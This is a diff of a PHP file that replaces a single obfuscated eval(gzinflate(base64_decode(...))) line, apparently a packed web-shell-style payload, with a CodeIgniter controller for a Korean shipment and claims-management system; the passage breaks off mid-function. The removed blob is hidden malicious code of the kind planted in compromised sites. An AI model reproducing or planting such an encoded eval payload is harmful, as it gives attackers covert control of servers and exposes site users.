@@ -1,1 +1,647 @@
-<?php eval(gzinflate(base64_decode('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')));
+<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+class Rel extends CI_Controller {
+
+	public $data;
+
+	public function __construct()
+	{
+		parent::__construct();
+
+		$this->data['pos'] = $this->uri->segment(1);
+        $this->data['subpos'] = $this->uri->segment(2);
+		
+		$this->load->model(array('release_model','bom_model', 'main_model'));
+
+		$this->data['siteTitle'] = $this->config->item('site_title');
+
+		
+
+	}
+
+	public function _remap($method, $params = array())
+	{
+		if($this->input->is_ajax_request()){
+            if( method_exists($this, $method) ){
+                call_user_func_array(array($this,$method), $params);
+            }
+        }else{ //ajax가 아니면
+			
+			if (method_exists($this, $method)) {
+
+				$user_id = $this->session->userdata('user_id');
+				if(isset($user_id) && $user_id != ""){
+					
+					$this->load->view('/layout/header',$this->data);
+					call_user_func_array(array($this,$method), $params);
+					$this->load->view('/layout/tail');
+
+				}else{
+
+					alert('로그인이 필요합니다.',base_url('register/login'));
+
+				}
+
+            } else {
+                show_404();
+            }
+
+        }
+		
+	}
+
+
+	public function r1($idx=0)
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		$data['str']['trans_sdate'] = $this->input->get('trans_sdate'); //TRANS_DATE
+		$data['str']['trans_edate'] = $this->input->get('trans_edate'); //TRANS_DATE
+		/*
+		$data['str']['customer'] = $this->input->get('customer'); //CUSTOMER
+		$data['str']['pln1'] = $this->input->get('pln1'); //PLN_DATE
+		$data['str']['pln2'] = $this->input->get('pln2'); //PLN_DATE
+		$data['str']['insert1'] = $this->input->get('insert1'); //DATE
+		$data['str']['insert2'] = $this->input->get('insert2'); //DATE
+		*/
+		
+		$params['GJ_GB'] = "ASS";
+		$params['TRANS_SDATE'] = "";
+		$params['TRANS_EDATE'] = "";
+		
+		/*$params['BL_NO'] = "";
+		$params['CUSTOMER'] = "";
+		$params['PLN1'] = "";
+		$params['PLN2'] = "";
+		$params['INSERT1'] = "";
+		$params['INSERT2'] = "";*/
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		}
+		
+		if(!empty($data['str']['trans_sdate'])){
+			$params['TRANS_SDATE'] = $data['str']['trans_sdate'];
+			$data['qstr'] .= "&trans_sdate=".$data['str']['trans_sdate'];
+		}
+		if(!empty($data['str']['trans_edate'])){
+			$params['TRANS_EDATE'] = $data['str']['trans_edate'];
+			$data['qstr'] .= "&trans_edate=".$data['str']['trans_edate'];
+		}
+		/*
+		if(!empty($data['str']['customer'])){
+			$params['CUSTOMER'] = $data['str']['customer'];
+			$data['qstr'] .= "&customer=".$data['str']['customer'];
+		}
+		if(!empty($data['str']['pln1'])){
+			$params['PLN1'] = $data['str']['pln1'];
+			$data['qstr'] .= "&pln1=".$data['str']['pln1'];
+		}
+		if(!empty($data['str']['pln2'])){
+			$params['PLN2'] = $data['str']['pln2'];
+			$data['qstr'] .= "&pln2=".$data['str']['pln2'];
+		}
+		if(!empty($data['str']['insert1'])){
+			$params['INSERT1'] = $data['str']['insert1'];
+			$data['qstr'] .= "&insert1=".$data['str']['insert1'];
+		}
+		if(!empty($data['str']['insert2'])){
+			$params['INSERT2'] = $data['str']['insert2'];
+			$data['qstr'] .= "&insert2=".$data['str']['insert2'];
+		}*/
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+		
+
+		$data['title'] = "출고등록";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['relList']  = $this->release_model->get_release_list($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->release_model->get_release_cut($params);
+
+		
+		$data['GJ_GB']    = $this->main_model->get_selectInfo("tch.CODE","GJ_GB");
+
+		$data['idx'] = $idx;
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+
+		$this->load->view('/release/r1',$data);
+		
+	}
+
+	
+	/* 기간별/업체별 출고내역 */
+	public function r2()
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['blno'] = $this->input->get('blno'); //BL_NO
+		$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		$data['str']['cg_date'] = $this->input->get('cg_date'); //CG_DATE
+		$data['str']['cg_date_end'] = $this->input->get('cg_date_end'); //CG_DATE
+		$data['str']['customer'] = $this->input->get('customer'); //CG_DATE
+		
+		$params['BL_NO'] = "";
+		$params['GJ_GB'] = "";
+		$params['CG_DATE'] = "";
+		$params['CG_DATE_END'] = "";
+		$params['CUSTOMER'] = "";
+
+
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['blno'])){
+			$params['BL_NO'] = $data['str']['blno'];
+			$data['qstr'] .= "&blno=".$data['str']['blno'];
+		}
+
+
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		}
+
+		
+		if(!empty($data['str']['cg_date'])){
+			$params['CG_DATE'] = $data['str']['cg_date'];
+			$data['qstr'] .= "&cg_date=".$data['str']['cg_date'];
+		}
+
+		if(!empty($data['str']['cg_date_end'])){
+			$params['CG_DATE_END'] = $data['str']['cg_date_end'];
+			$data['qstr'] .= "&cg_date_end=".$data['str']['cg_date_end'];
+		}
+
+		if(!empty($data['str']['customer'])){
+			$params['CUSTOMER'] = $data['str']['customer'];
+			$data['qstr'] .= "&customer=".$data['str']['customer'];
+		}
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+		
+
+		$data['title'] = "기간별/업체별 출고내역";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['relList']  = $this->release_model->get_itemtrans_list_r2($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->release_model->get_itemtrans_cut_r2($params);
+
+		$data['GJ_GB']    = $this->main_model->get_selectInfo("tch.CODE","GJ_GB");
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+
+		$this->load->view('/release/r2',$data);
+		
+	}
+
+
+	/* 제공품내역 */
+	public function r3($bno='',$qty = 0)
+	{
+		
+		$data['str'] = array(); //검색어관련
+		$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		$data['str']['pln_date'] = $this->input->get('pln_date'); //PLN_DATE
+		$data['str']['pln_date_end'] = $this->input->get('pln_date_end'); //PLN_DATE
+
+		$params['GJ_GB'] = "";
+		$params['PLN_DATE'] = "";
+		$params['PLN_DATE_END'] = "";
+
+		
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		
+		}
+
+		
+		if(!empty($data['str']['pln_date'])){
+			$params['PLN_DATE'] = $data['str']['pln_date'];
+			$data['qstr'] .= "&pln_date=".$data['str']['pln_date'];
+		
+		}
+
+		if(!empty($data['str']['pln_date_end'])){
+			$params['PLN_DATE_END'] = $data['str']['pln_date_end'];
+			$data['qstr'] .= "&pln_date_end=".$data['str']['pln_date_end'];
+		
+		}
+
+		
+		
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+		
+
+		$data['title'] = "제공품내역";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['relList']  = $this->release_model->get_itemtrans_list_r3($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->release_model->get_itemtrans_cut_r3($params);
+
+		$data['insertBomList'] = array();
+		if(!empty($bno)){
+			$data['insertBomList'] = $this->bom_model->get_bom_list_r3($bno,$qty);
+		}
+		$data['GJ_GB']    = $this->main_model->get_selectInfo("tch.CODE","GJ_GB");
+
+		$data['bno'] = $bno;
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+
+		$this->load->view('/release/r3',$data);
+		
+	}
+
+	
+	/* 클래임등록 */
+	public function r4($idx=0)
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		$data['str']['re_date'] = $this->input->get('re_date');
+		$data['str']['re_date_end'] = $this->input->get('re_date_end'); //CG_DATE
+
+		$params['GJ_GB'] = "";
+		$params['RE_DATE'] = "";
+		$params['RE_DATE_END'] = "";
+
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		}
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['re_date'])){
+			$params['RE_DATE'] = $data['str']['re_date'];
+			$data['qstr'] .= "&re_date=".$data['str']['re_date'];
+		}
+		if(!empty($data['str']['re_date_end'])){
+			$params['RE_DATE_END'] = $data['str']['re_date_end'];
+			$data['qstr'] .= "&re_date_end=".$data['str']['re_date_end'];
+		}
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+		
+
+		$data['title'] = "클래임등록";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['relList']  = $this->release_model->get_itemtrans_list_xx($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->release_model->get_itemtrans_cut_xx($params);
+
+		$data['GJ_GB']    = $this->main_model->get_selectInfo("tch.CODE","GJ_GB");
+
+		$data['idx'] = $idx;
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+
+		$this->load->view('/release/r4',$data);
+		
+	}
+
+
+
+	/* 클래임내역조회 */
+	public function r5($idx=0)
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		$data['str']['cg_date'] = $this->input->get('cg_date'); //CG_DATE
+
+		$params['GJ_GB'] = "";
+		$params['CG_DATE'] = "";
+
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		}
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['cg_date'])){
+			$params['CG_DATE'] = $data['str']['cg_date'];
+			$data['qstr'] .= "&cg_date=".$data['str']['cg_date'];
+		}
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+		
+
+		$data['title'] = "클래임내역조회";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['relList']  = $this->release_model->get_itemtrans_list($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->release_model->get_itemtrans_cut($params);
+
+		$data['GJ_GB']    = $this->main_model->get_selectInfo("tch.CODE","GJ_GB");
+
+		$data['idx'] = $idx;
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
